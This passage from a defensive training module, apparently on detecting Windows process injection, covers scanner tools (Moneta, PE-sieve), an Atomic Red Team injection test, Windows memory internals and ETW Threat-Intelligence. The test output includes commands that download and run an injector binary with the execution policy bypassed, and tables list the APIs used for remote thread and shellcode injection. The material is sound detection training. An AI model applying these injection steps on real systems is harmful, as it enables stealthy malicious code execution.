--filter {unsigned-module|clr-prvx|clr-heap|metadata-modules}
--address <memory address>
--region-size <memory region size>

-m                  The memory to select and apply scanner settings to.

                    *                   Select all regions of committed memory.
                    ioc                 Select only regions which have suspicions associated with them.
                    region              Select only the region(s) which overlap with the region provided
                                        through the --address and --region-size arguments.
                    referenced          Select only regions which are referenced within the region(s)
                                        associated with the provided --address and --region-size arguments
-p                  The process(es) to scan. In the event that * is used, all accessible processes will
                    be enumerated and scanned.
--option            Additional actions to optionally apply to the memory selected from the scan.

                    from-base           All subregions associated with the allocation bases of all
                                        selected memory will also be selected.
                    statistics          Calculate permission statistics on the selected memory after a
                                        scan has completed.
-d                  Dump all selected memory to the local file system after each process scan is complete.
--address           A memory address in 0x* format to be used in conjunction with either the "region" or
                    "referenced" selection types.
--region-size       Optionally specify the size of the region of the provided "--address." The default is
                    a region size of 0.
-v                  The verbosity level with which to print information related to the selected memory.
                    The default is "surface"
--filter            The filters to apply when eliminating suspicions associated with selected memory.

                    *                   Apply all filters. Only malware and unknown false positives shown.
                    unsigned-module     Regions of image memory associated with unsigned PE files.
                    metadata-modules    Regions of image memory stemming from signed Windows metadata PE
                                        files on disk.
                    clr-heap            Native executable heaps created during CLR initialization.
                    clr-prvx            Managed heaps associated with active CLR heaps and JIT code.
                    wow64-init          IOCs resulting from Wow64 process initialization such as certain
                                        modified system library code sections

```

We can use the `-m ioc` command to enumerate only regions related to suspicious memory in a specific process ( `-p PID`):

```powershell
PS C:\injection\tools> .\Moneta64.exe -m ioc -p 1234
   _____                        __
  /     \   ____   ____   _____/  |______
 /  \ /  \ /  _ \ /    \_/ __ \   __\__  \
/    Y    (  <_> )   |  \  ___/|  |  / __ \_
\____|__  /\____/|___|  /\___  >__| (____  /
        \/            \/     \/          \/

Moneta v1.0 | Forrest Orr | 2020

sample.exe : 1234 : x64 : C:\injection\sample.exe
  0x0000019656C80000:0x00001000   | Private
    0x0000019656C80000:0x00001000 | RWX      | 0x00000000 | Abnormal private executable memory | Thread within non-image memory region
      Thread 0x0000019656C80000 [TID 0x00001758]
  0x00007FF61C980000:0x00011000   | EXE Image           | C:\injection\sample\sample.exe | Unsigned module

... scan completed (1.328000 second duration)

```

* * *

## PE-sieve

[PE-sieve](https://github.com/hasherezade/pe-sieve) is a tool that helps detect malware running on the system, as well as collect potentially malicious material for further analysis. It recognizes and dumps a variety of implants within the scanned process: replaced/injected PEs, shellcodes, hooks, and other in-memory patches. It also detects inline hooks, Process Hollowing, Process Doppelgänging, Reflective DLL injection, etc.

The executable can be downloaded from the [releases](https://github.com/hasherezade/pe-sieve/releases) section from the official Github repository. The output below shows the help section:

```powershell
PS C:\injection\tools> .\pe-sieve64.exe
.______    _______           _______. __   ___________    ____  _______
|   _  \  |   ____|         /       ||  | |   ____\   \  /   / |   ____|
|  |_)  | |  |__    ______ |   (----`|  | |  |__   \   \/   /  |  |__
|   ___/  |   __|  |______| \   \    |  | |   __|   \      /   |   __|
|  |      |  |____      .----)   |   |  | |  |____   \    /    |  |____
| _|      |_______|     |_______/    |__| |_______|   \__/     |_______|
  _        _______       _______      __   _______     __       _______
________________________________________________________________________

Version:  0.3.9 (x64)
Built on: Feb 24 2024

~ from hasherezade with love ~
Scans a given process, recognizes and dumps a variety of in-memory implants:
replaced/injected PEs, shellcodes, inline hooks, patches etc.
URL: https://github.com/hasherezade/pe-sieve
---

Required:
/pid <integer: decimal, or hexadecimal with '0x' prefix>
         : Set the PID of the target process.

Optional:

---1. scanner settings---
/quiet
         : Print only the summary. Do not log on stdout during the scan.
/refl
         : Make a process reflection before scan.

---2. scan exclusions---
/dnet <*dotnet_policy>
         : Set the policy for scanning managed processes (.NET).
/mignore <list: separated by ';'>
         : Do not scan module/s with given name/s.

---3. scan options---
/data <*data_scan_mode>
         : Set if non-executable pages should be scanned.
/iat <*iat_scan_mode>
         : Scan for IAT hooks.
/obfusc <*obfusc_mode>
         : Detect encrypted content, and possible obfuscated shellcodes.
/pattern <string>
         : Set additional shellcode patterns (file in the SIG format).
/shellc <*shellc_mode>
         : Detect shellcode implants (by patterns or statistics).
/threads
         : Scan threads' callstack. Detect shellcodes, incl. 'sleeping beacons'.

---4. dump options---
/dmode <*dump_mode>
         : Set in which mode the detected PE files should be dumped.
/imp <*imprec_mode>
         : Set in which mode the ImportTable should be recovered
/minidmp
         : Create a minidump of the full suspicious process.

---5. output options---
/dir <string>
         : Set a root directory for the output (default: current directory).
/jlvl <*json_lvl>
         : Level of details of the JSON report.
/json
         : Print the JSON report as the summary.
/ofilter <*ofilter_id>
         : Filter the dumped output.

Info:
/help
         : Print complete help.
/help <string>
         : Print help about a given keyword.
/<param> ?
         : Print details of a given parameter.
/version
         : Print version info.
---
Press any key to continue . . .

```

To detect the shellcode, we need to provide the `/shellc 3` option, which instructs PE-sieve to scan the process memory for signs of a shellcode. The value 3 specifies the mode, which scans all memory regions with an advanced heuristics for shellcode detection. We also need to provide the PID, i.e., `/pid 1234`, to scan the process. This detects the injected shellcode from the scanned process and dumps it.

```powershell
PS C:\injection\tools> .\pe-sieve64.exe /shellc 3 /pid 1234
PID: 1234
Output filter: no filter: dump everything (default)
Dump mode: autodetect (default)
[*] Using raw process!
[*] Scanning: C:\injection\sample\sample.exe
[*] Scanning: C:\Windows\System32\ntdll.dll
[*] Scanning: C:\Windows\System32\kernel32.dll
[*] Scanning: C:\Windows\System32\KERNELBASE.dll
[*] Scanning: C:\Windows\System32\msvcrt.dll
[*] Scanning: C:\Windows\System32\user32.dll
[*] Scanning: C:\Windows\System32\win32u.dll
[*] Scanning: C:\Windows\System32\gdi32.dll
[*] Scanning: C:\Windows\System32\gdi32full.dll
[*] Scanning: C:\Windows\System32\msvcp_win.dll
[*] Scanning: C:\Windows\System32\ucrtbase.dll
[*] Scanning: C:\Windows\System32\imm32.dll
[*] Scanning: C:\Windows\System32\TextShaping.dll
[*] Scanning: C:\Windows\System32\uxtheme.dll
[*] Scanning: C:\Windows\System32\combase.dll
[*] Scanning: C:\Windows\System32\rpcrt4.dll
[*] Scanning: C:\Windows\System32\msctf.dll
[*] Scanning: C:\Windows\System32\oleaut32.dll
[*] Scanning: C:\Windows\System32\sechost.dll
[*] Scanning: C:\Windows\System32\kernel.appcore.dll
[*] Scanning: C:\Windows\System32\bcryptPrimitives.dll
[*] Scanning: C:\Windows\System32\textinputframework.dll
[*] Scanning: C:\Windows\System32\CoreMessaging.dll
[*] Scanning: C:\Windows\System32\CoreUIComponents.dll
[*] Scanning: C:\Windows\System32\ws2_32.dll
[*] Scanning: C:\Windows\System32\WinTypes.dll
[*] Scanning: C:\Windows\System32\ntmarta.dll
[*] Scanning: C:\Windows\System32\SHCore.dll
[*] Scanning: C:\Windows\System32\advapi32.dll
Scanning workingset: 206 memory regions.
[*] Workingset scanned in 47 ms.
[+] Report dumped to: process_1234
[*] Dumped module to: C:\injection\sample\\process_1234\1e9a5740000.shc as VIRTUAL
[+] Dumped modified to: process_1234
[+] Report dumped to: process_1234
---
PID: 1234
---
SUMMARY:

Total scanned:      29
Skipped:            0
-
Hooked:             0
Replaced:           0
Hdrs Modified:      0
IAT Hooks:          0
Implanted:          1
Implanted PE:       0
Implanted shc:      1
Unreachable files:  0
Other:              0
-
Total suspicious:   1
---

```

## Atomic Red Team

[Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) is an adversary simulation framework that allows security teams to test attack techniques from the MITRE ATT&CK framework in a controlled environment. This contains small and highly portable detection tests based on MITRE's ATT&CK. The list of different tests can be viewed [here](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md).

To start, we can open PowerShell as an administrator. Then, we configure the `ExecutionPolicy` to `bypass` to avoid the security warnings for this module.

```powershell
PS C:\> powershell -ExecutionPolicy bypass

```

Import the `AtomicRedTeam.psd1` module from the path mentioned below:

```powershell
PS C:\> Import-Module C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1

```

At this point, we can test if it is imported successfully by invoking the help menu:

```powershell
PS C:\Users\Administrator> help Invoke-AtomicTest

NAME
    Invoke-AtomicTest

SYNTAX
    Invoke-AtomicTest [-AtomicTechnique] <string[]> [-ShowDetails] [-ShowDetailsBrief] [-anyOS] [-TestNumbers <string[]>] [-TestNames <string[]>] [-TestGuids <string[]>] [-PathToAtomicsFolder <string>] [-CheckPrereqs] [-PromptForInputArgs] [-GetPrereqs] [-Cleanup]
    [-NoExecutionLog] [-ExecutionLogPath <string>] [-Force] [-InputArgs <hashtable>] [-TimeoutSeconds <int>] [-Session <PSSession[]>] [-Interactive] [-KeepStdOutStdErrFiles] [-LoggingModule <string>] [-SupressPathToAtomicsFolder] [-WhatIf] [-Confirm]
    [<CommonParameters>]

ALIASES
    None

REMARKS
    None

```

We can check the details of a specific MITRE technique ( `T1055.002`) using the command below:

```powershell
PS C:\Users\Administrator> Invoke-AtomicTest T1055.002 -ShowDetails
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Process Injection: Portable Executable Injection T1055.002
Atomic Test Name: Portable Executable Injection
Atomic Test Number: 1
Atomic Test GUID: 578025d5-faa9-4f6d-8390-aae739d503e1
Description: This test injects a portable executable into a remote Notepad process memory using Portable Executable Injection and base-address relocation techniques. When successful, a message box will appear with the title "Warning" and the content "Atomic Red Team" after a few seconds.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
Start-Process "#{exe_binary}"
Start-Sleep -Seconds 7
Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
Command (with inputs):
Start-Process "C:\AtomicRedTeam\atomics\T1055.002\bin\RedInjection.exe"
Start-Sleep -Seconds 7
Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force

Cleanup Commands:
Command:
Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force

Dependencies:
Description: Portable Executable to inject must exist at specified location (C:\AtomicRedTeam\atomics\T1055.002\bin\RedInjection.exe)
Check Prereq Command:
if (Test-Path "#{exe_binary}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1055.002\bin\RedInjection.exe") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{exe_binary}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.002/bin/RedInjection.exe" -OutFile "#{exe_binary}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1055.002\bin\RedInjection.exe") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.002/bin/RedInjection.exe" -OutFile "C:\AtomicRedTeam\atomics\T1055.002\bin\RedInjection.exe"
[!!!!!!!!END TEST!!!!!!!]

```

We can also check the prerequisites before running a test using the `-CheckPrereqs` flag.

```powershell
PS C:\Users\Administrator> Invoke-AtomicTest T1055.002 -CheckPrereqs
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

CheckPrereq's for: T1055.002-1 Portable Executable Injection
Prerequisites met: T1055.002-1 Portable Executable Injection

```

To execute the test, we can run the test using the command below. This simulates the MITRE ATT&CK technique, i.e., Process Injection: Portable Executable Injection T1055.002.

```powershell
PS C:\Users\Administrator> Invoke-AtomicTest T1055.002
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

Executing test: T1055.002-1 Portable Executable Injection
Exit code: 0
Done executing test: T1055.002-1 Portable Executable Injection

```


# Internals and Key Structures

Process injection is used to execute malicious code in legitimate Windows processes stealthily. To conduct effective malware analysis and detect these attacks, a profound understanding of Windows internals, including how Windows manages processes, memory, and execution flows, is essential.

Windows operating systems function in two main modes:

- `User Mode`: This mode is where most applications and user processes operate. Applications in user mode have limited access to system resources and must interact with the operating system through Application Programming Interfaces (APIs). These processes are isolated from each other and cannot directly access hardware or critical system functions.

- `Kernel Mode`: Kernel mode is a highly privileged mode where the Windows kernel runs. The kernel has unrestricted access to system resources, hardware, and critical functions. Device drivers, which facilitate communication with hardware devices, also run in kernel mode.


The image below showcases a simplified version of Windows architecture:

![Detect](https://academy.hackthebox.com/storage/modules/266/user-krnl.png)

`User-mode components` are those parts of the operating system that don't have direct access to hardware or kernel data structures. They interact with system resources through APIs and system calls. `Kernel-mode components` have direct access to hardware and kernel data structures.

## Processes

A Windows process is an instance of a running program. Each process has its own virtual address space, executable code, open handles to system objects, a security context (represented by an access token), a unique process identifier (PID), and at least one thread of execution. A new process can be created using functions like [CreateProcessA()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa), [CreateProcessAsUserA()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-CreateProcessAsUserA), [CreateProcessWithTokenW()](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw), [CreateProcessWithLogonW()](http://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw) and many more. The process-related functions are documented by Microsoft [here](https://learn.microsoft.com/en-us/windows/win32/procthread/process-and-thread-functions#process-functions).

The diagram below illustrates the fundamental components of a process in Windows, highlighting its memory isolation, thread execution, management of system object references, and security context.

![Detect](https://academy.hackthebox.com/storage/modules/266/procobj.png)

Windows tracks process details using the `EPROCESS` structure in the kernel.

To check the process details, we can use tools like `WinDbg` ( `dt _EPROCESS`), `Process Explorer`/ `Hacker`. Tools from Sysinternals can also help to inspect processes.

In WinDbg, go to the File menu and select " `Start Debugging`". Choose the " `Attach to kernel`" dialog and switch to the Local tab. Then click the OK button to start the kernel debugging session. We should be able to see the prompt `lkd>`, which indicates that we are now attached to the local kernel.

To display the type information for the `_EPROCESS` structure in WinDbg, we can use the `dt` (display type) command to view the `EPROCESS` structure:

```cmd-session
lkd> dt nt!_EPROCESS

```

When we run the command `dt nt!_EPROCESS` in WinDbg, we might see output similar to the following (the actual output may vary depending on the Windows version and symbols loaded):

```cmd-session
lkd> dt nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x2d8 ProcessLock      : _EX_PUSH_LOCK
   +0x2e0 UniqueProcessId  : Ptr64 Void
   +0x2e8 ActiveProcessLinks : _LIST_ENTRY
<SNIP>
   +0x358 Token            : _EX_FAST_REF
   +0x360 MmReserved       : Uint8B
   +0x368 AddressCreationLock : _EX_PUSH_LOCK
<SNIP>
   +0x6c9 SectionSignatureLevel : UChar
   +0x6ca Protection       : _PS_PROTECTION
   +0x6cb HangCount        : Pos 0, 3 Bits
   +0x6cb GhostCount       : Pos 3, 3 Bits
<SNIP>

```

`WinDbg` will display the definition of the `_EPROCESS` structure, showing all its members and their offsets. This is useful for understanding the internal layout of the process structure in Windows and for navigating through it during debugging.

To view the `EPROCESS` structure of a running process, we can search for the process name, and pass the address of its `EPROCESS` structure.

![Detect](https://academy.hackthebox.com/storage/modules/266/win-eproc.png)

### PEB

The Process Environment Block ( [PEB](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)) stores important information about a running process, such as loaded modules and memory layout.

Let's open WinDbg as an administrator. Click File and select Launch Executable. Then browse to `C:\Windows\System32\cmd.exe` and open it.

To view the PEB (Process Environment Block) we can use the `!peb` extension:

![Detect](https://academy.hackthebox.com/storage/modules/266/win-peb.png)

The [PEB\_LDR\_DATA](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data) structure inside the PEB (represented as `Ldr`) contains a linked list of loaded modules. Let's browse to the address of Ldr using the `dt nt!_PEB_LDR_DATA <address>` command.

![Detect](https://academy.hackthebox.com/storage/modules/266/win-ldr.png)

The head of a doubly-linked list contains the loaded modules for the process. Each item in the list is a pointer to an `LDR_DATA_TABLE_ENTRY` structure.

![Detect](https://academy.hackthebox.com/storage/modules/266/win-load.png)

For example, if we go to the next item, it represents the next loaded module, i.e., `ntdll.dll`.

![Detect](https://academy.hackthebox.com/storage/modules/266/win-load1.png)

We can iterate through it and find all the loaded modules.

## Threads

Each process consists of one or more threads, which execute instructions. Threads share the same memory space. A thread can execute any part of the process code, including parts currently being executed by another thread. Attackers manipulate threads to execute payloads in remote processes.

The Thread Environment Block ( [TEB](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-teb)) structure describes the state of a thread.

![Detect](https://academy.hackthebox.com/storage/modules/266/win-teb_.png)

### Check Current Thread in WinDbg

The `~.` command in WinDbg is used to display information about the current thread. As we're debugging `cmd.exe`, we can see details about the active thread, including its thread ID, state, and current instruction pointer.

![Detect](https://academy.hackthebox.com/storage/modules/266/win-start.png)

We can also view the threads in Process Hacker, as shown in the screenshot above (Threads tab on the right side).

Important API Calls:

| Function | Description |
| --- | --- |
| `CreateRemoteThread()`, `NtCreateThreadEx()` | Used for remote thread injection |
| `QueueUserAPC()` | Used in APC injection to execute code at thread wake-up |
| `GetThreadContext()`, `SetThreadContext()` | Used for thread hijacking |

The thread-related functions are documented by Microsoft [here](https://learn.microsoft.com/en-us/windows/win32/procthread/process-and-thread-functions#thread-functions).

## Virtual Memory

Windows uses a virtual memory system that allows processes to allocate, modify, and execute memory dynamically. The Memory Manager is responsible for allocating virtual address space, handling memory protection, and swapping pages between RAM and disk as needed. Windows uses `paging` as a memory management technique, where the virtual memory is divided into fixed-size blocks called pages (typically 4 KB in size) and is mapped to physical memory, which is divided into page frames. A page table maintained by the operating system maps these virtual pages to their corresponding locations in physical memory. If the required data is not in RAM, it is swapped to and from the disk, a process known as page swapping.

The diagram below shows a visual representation of virtual to physical memory mapping.

![Detect](https://academy.hackthebox.com/storage/modules/266/mmry-mgmt.png)

Virtual `memory mapping` is a technique that allows the operating system to treat a portion of the disk as if it were additional RAM, by swapping data between the disk and physical memory as needed. This creates the `illusion` of a larger, continuous memory space for programs, even though the system’s physical memory may be much smaller. The mapping process ensures that each program has its own isolated address space, while managing memory between multiple processes.

Virtual memory can be shared across multiple processes. For example, shared libraries (DLLs) and memory-mapped files can be mapped into the virtual address space of multiple processes. This feature can be used by both legitimate software and malware.

The `virtual address space` for a process is the set of virtual memory addresses that it can use. The address space for each process is private and cannot be accessed by other processes unless it is shared. We can use Process Hacker to view the virtual memory address space for a process.

![Detect](https://academy.hackthebox.com/storage/modules/266/win-vm.png)

If we double-click on a virtual memory address, we can view the contents located at that address.

![Detect](https://academy.hackthebox.com/storage/modules/266/win-mem.png)

### Memory Page State

The pages within a process's virtual address space can exist in one of three possible states:

- `Free` – In this state, the page is not yet associated with any physical memory or allocated for any specific purpose, meaning the page is not accessible to the process. It is `available to be reserved or committed` as needed. If an attempt is made to read from or write to a free page, it can trigger an access violation exception because the page has no allocated memory. A process can use the [VirtualFree](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfree) or [VirtualFreeEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfreeex) function to release reserved or committed pages to change their state to free.
- `Reserved` – This state means the page is `reserved for future use`. While it occupies an address range that cannot be used by other memory allocation functions, it does not have any physical memory allocated to it. It is not accessible until it is committed. [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) or [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) can be used to reserve a memory page.
- `Committed` – When a page is committed, the system `allocates actual memory` resources from physical RAM or paging files on disk. The page `becomes accessible` to the process, and its access is controlled according to specific memory protection options (e.g., read-only, read-write, or executable). When the process ends, the system frees the memory associated with committed pages.

The screenshot below from Process Hacker shows the memory page state details:

![Detect](https://academy.hackthebox.com/storage/modules/266/memstate.png)

### Memory Page Protection Options

Once the pages are committed to memory, their `protection options` must be applied to define how the pages can be accessed. This includes specifying whether the pages are `readable`, `writable`, `executable`, or have any combination of these permissions. A process's memory is implicitly protected by its private virtual address space. For example, code pages in a process's address space can be marked as read-only and protected from modification. Some of the important memory protection [constants](https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants) that can be specified when allocating or protecting a page in memory are as follows.

| Constant/value | Description |
| --- | --- |
| `PAGE_EXECUTE` (0x10) | Enables execute access to the committed region of pages. An attempt to write to the committed region results in an access violation. |
| `PAGE_EXECUTE_READ` (0x20) | Enables execute or read-only access to the committed region of pages. An attempt to write to the committed region results in an access violation. |
| `PAGE_EXECUTE_READWRITE` (0x40) | Enables execute, read-only, or read/write access to the committed region of pages. |
| `PAGE_EXECUTE_WRITECOPY` (0x80) | Enables execute, read-only, or copy-on-write access to a mapped view of a file mapping object. |
| `PAGE_NOACCESS` (0x01) | Disables all access to the committed region of pages. An attempt to read from, write to, or execute the committed region results in an access violation. |
| `PAGE_READONLY` (0x02) | Enables read-only access to the committed region of pages. An attempt to write to the committed region results in an access violation. |
| `PAGE_READWRITE` (0x04) | Enables read-only or read/write access to the committed region of pages. |
| `PAGE_WRITECOPY` (0x08) | Enables read-only or copy-on-write access to a mapped view of a file mapping object. The private page is marked as PAGE\_READWRITE, and the change is written to the new page. |

In the screenshot below, we can see the Protection column in Process Hacker, which represents the value of the Memory Protection constant.

![Detect](https://academy.hackthebox.com/storage/modules/266/memprotect.png)

Key components of Windows memory management include Address Space Layout Randomization ( [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization)) for security, [Working Set](https://learn.microsoft.com/en-us/windows/win32/memory/working-set) Management to track active pages, and Paging and Swapping to ensure efficient use of RAM.

| Function | Description |
| --- | --- |
| `VirtualAllocEx()`, `NtAllocateVirtualMemory()` | Allocate memory in remote processes |
| `WriteProcessMemory()` | Write shellcode into allocated memory |
| `VirtualProtectEx()`, `NtProtectVirtualMemory()` | Change memory permissions (e.g., `RWX` for execution) |

The ETW Threat Intelligence Provider can log API calls related to memory allocation (Microsoft-Windows-Threat-Intelligence).

### Section Object & Memory Sharing

A `section` object represents a section of memory that can be shared. A process can use a section object to share parts of its memory address space (memory sections) with other processes. Section objects also provide the mechanism by which a process can map a file into its memory address space. Each memory section has one or more corresponding views. A `view` of a section is a part of the section that is actually visible to a process. The act of creating a view for a section is known as mapping a view of the section. Each process that is manipulating the contents of a section has its own view; a process can also have multiple views (to the same or different sections).

Section objects ( [NtCreateSection()](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntcreatesection), [NtMapViewOfSection()](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection)) are used for memory-mapped injections.

### How Windows Loads Executable Images?

An executable image (such as an .exe or .dll file) is loaded into memory through the Windows Loader. This process ensures that all necessary dependencies (DLLs, system files, etc.) are mapped into the process’s address space. Windows maintains a record of loaded modules using the Process Environment Block (PEB), specifically within the `Ldr` (Loader) structure, which stores information about loaded DLLs.

The loader maps the executable file into the process's address space. This involves reading the PE headers to determine how to load the various sections of the file (e.g., code, data, resources). The loader sets up the memory layout according to the information in the PE headers.

The [PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format) file specifies a preferred base address where it should be loaded. If that address is available, the loader maps the executable there. If not, the loader performs `relocation`, adjusting addresses in the code and data to fit the available memory. It uses the relocation table in the PE file to update addresses as necessary. If the executable depends on dynamic link libraries (DLLs), the loader resolves these dependencies. It locates the required DLLs, loads them into memory, and links them to the executable. For this, the loader uses the import table in the PE file to find the addresses of functions and variables that the executable needs from the DLLs.

After loading and linking, the loader transfers control to the executable's entry point, which is specified in the PE header. This is where the program begins execution. If the executable is a C/C++ program, the C runtime library (CRT) is initialized, which sets up the environment for the program. Then the program runs in its own process space. When the program finishes execution, it calls the exit function, which cleans up resources and terminates the process. The operating system then reclaims the memory and resources used by the process.


# ETW Threat-Intelligence (ETW-TI)

This section provides information and details about how ETW-TI events are logged for different Windows API functions used in Process Injection attacks. The section is informative.

Event Tracing for Windows ( [ETW](https://learn.microsoft.com/en-us/windows/win32/etw/about-event-tracing)) is a logging and diagnostics framework built into the Windows operating system that enables event tracing for system and application monitoring.

ETW operates through event providers, controllers, and consumers:

- `Providers` generate events (e.g., the Windows Kernel, applications, drivers).
- `Controllers` enable or disable event tracing.
- `Consumers` collect and analyze event data.

To list the ETW providers, we can use the `logman query providers` command:

```cmd-session
C:\> logman query providers

Provider                                 GUID
-------------------------------------------------------------------------------
ACPI Driver Trace Provider               {DAB01D4D-2D48-477D-B1C3-DAAD0CE6F06B}
Active Directory Domain Services: SAM    {8E598056-8993-11D2-819E-0000F875A064}
Active Directory: Kerberos Client        {BBA3ADD2-C229-4CDB-AE2B-57EB6966B0C4}
Active Directory: NetLogon               {F33959B4-DBEC-11D2-895B-00C04F79AB69}
<SNIP>
Microsoft-Windows-Kernel-File            {EDD08927-9CC4-4E65-B970-C2560FB5C289}
Microsoft-Windows-Kernel-General         {A68CA8B7-004F-D7B6-A698-07E2DE0F1F5D}
Microsoft-Windows-Kernel-Interrupt-Steering {951B41EA-C830-44DC-A671-E2C9958809B8}
Microsoft-Windows-Kernel-IO              {ABF1F586-2E50-4BA8-928D-49044E6F0DB7}
Microsoft-Windows-Kernel-IoTrace         {A103CABD-8242-4A93-8DF5-1CDF3B3F26A6}
Microsoft-Windows-Kernel-Licensing-StartServiceTrigger {F5528ADA-BE5F-4F14-8AEF-A95DE7281161}
Microsoft-Windows-Kernel-LicensingSqm    {A0AF438F-4431-41CB-A675-A265050EE947}
Microsoft-Windows-Kernel-LiveDump        {BEF2AA8E-81CD-11E2-A7BB-5EAC6188709B}
Microsoft-Windows-Kernel-Memory          {D1D93EF7-E1F2-4F45-9943-03D245FE6C00}
Microsoft-Windows-Kernel-Network         {7DD42A49-5329-4832-8DFD-43D979153A88}
Microsoft-Windows-Kernel-Pep             {5412704E-B2E1-4624-8FFD-55777B8F7373}
Microsoft-Windows-Kernel-PnP             {9C205A39-1250-487D-ABD7-E831C6290539}
Microsoft-Windows-Kernel-PnP-Rundown     {B3A0C2C8-83BB-4DDF-9F8D-4B22D3C38AD7}
Microsoft-Windows-Kernel-Power           {331C3B3A-2005-44C2-AC5E-77220C37D6B4}
Microsoft-Windows-Kernel-PowerTrigger    {AA1F73E8-15FD-45D2-ABFD-E7F64F78EB11}
Microsoft-Windows-Kernel-Prefetch        {5322D61A-9EFA-4BC3-A3F9-14BE95C144F8}
Microsoft-Windows-Kernel-Process         {22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}
<SNIP>

```

To get more information about an ETW provider, we can use the `logman query providers <provider>` followed by the specific provider, for instance, `Microsoft-Windows-Kernel-Process`, or we can use the respective GUID `"{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}"`:

```cmd-session
C:\>logman query providers Microsoft-Windows-Kernel-Process

Provider                                 GUID
-------------------------------------------------------------------------------
Microsoft-Windows-Kernel-Process         {22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}

Value               Keyword              Description
-------------------------------------------------------------------------------
0x0000000000000010  WINEVENT_KEYWORD_PROCESS
0x0000000000000020  WINEVENT_KEYWORD_THREAD
0x0000000000000040  WINEVENT_KEYWORD_IMAGE
0x0000000000000080  WINEVENT_KEYWORD_CPU_PRIORITY
0x0000000000000100  WINEVENT_KEYWORD_OTHER_PRIORITY
0x0000000000000200  WINEVENT_KEYWORD_PROCESS_FREEZE
0x0000000000000400  WINEVENT_KEYWORD_JOB
0x0000000000000800  WINEVENT_KEYWORD_ENABLE_PROCESS_TRACING_CALLBACKS
0x0000000000001000  WINEVENT_KEYWORD_JOB_IO
0x0000000000002000  WINEVENT_KEYWORD_WORK_ON_BEHALF
0x0000000000004000  WINEVENT_KEYWORD_JOB_SILO
0x8000000000000000  Microsoft-Windows-Kernel-Process/Analytic

Value               Level                Description
-------------------------------------------------------------------------------
0x04                win:Informational    Information

PID                 Image
-------------------------------------------------------------------------------
0x00000000

The command completed successfully.

```

## ETW-TI

Microsoft-Windows-Threat-Intelligence is an ETW provider defined by a manifest that logs security-related events. What sets the TI (Threat Intelligence) provider apart is that it is regularly updated by Microsoft, enhancing its ability to capture detailed operations that would typically require advanced techniques, such as function hooking, in the kernel. This provider is a great resource for detecting process injection attacks in addition to other useful detections.

The screenshot below shows the list of types of events supported by ETW-TI queried using `logman`.

![ETW_TI](https://academy.hackthebox.com/storage/modules/266/etwti_image.png)

## ETW-TI Internals

Kernel providers are registered using `nt!EtwRegister` function exported by [ntoskrnl](https://en.wikipedia.org/wiki/Ntoskrnl.exe). The screenshot below from IDA shows the decompiled version of [EtwRegister](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-etwregister).

![ETW_TI](https://academy.hackthebox.com/storage/modules/266/etwti_image-1.png)

This function registers an ETW provider by calling the internal function EtwpRegisterProvider. It casts the provided callback function and provider ID to integers and passes these, along with other parameters, to EtwpRegisterProvider. The function then returns the status code from EtwpRegisterProvider.

Press ' `x`' to check the cross-references to the EtwRegister function, where we can see the EtwInitialize function.

![ETW_TI](https://academy.hackthebox.com/storage/modules/266/etwti_image-2.png)

The `EtwpInitialize` function is responsible for setting up various components related to Event Tracing for Windows (ETW). An important part is the registration of multiple ETW providers using `EtwRegister`, each with different GUIDs and callback functions.

![ETW_TI](https://academy.hackthebox.com/storage/modules/266/etwti_image-3.png)

Let's check the format of the `EtwRegister` function:

```c
NTSTATUS EtwRegister(
  [in]           LPCGUID            ProviderId,
  [in, optional] PETWENABLECALLBACK EnableCallback,
  [in, optional] PVOID              CallbackContext,
  [out]          PREGHANDLE         RegHandle
);

```

The first value provided, `ProviderId`, is a pointer to a GUID that uniquely identifies the ETW provider. If we double-click on the `ThreatIntProviderGuid`, we see its value, which is the same as the ETW-TI GUID `F4E1897C-BB5D-5668-F1D8-040F4D8DD344`.

